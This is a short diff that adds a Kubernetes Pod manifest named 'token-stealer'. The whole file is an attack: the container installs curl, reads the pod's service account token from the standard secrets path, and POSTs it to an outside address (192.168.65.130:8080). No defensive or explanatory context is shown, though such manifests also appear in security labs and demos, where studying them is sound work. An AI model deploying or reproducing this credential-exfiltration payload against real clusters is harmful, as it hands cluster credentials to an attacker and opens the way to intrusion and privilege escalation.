@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: token-stealer
+spec:
+  containers:
+  - name: stealer
+    image: debian
+    command:
+      - /bin/bash
+      - -c
+      - |
+        apt update && apt install -y curl jq;
+        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
+        curl -X POST http://192.168.65.130:8080 --data "token=$TOKEN";
+        sleep 30
+  restartPolicy: Never
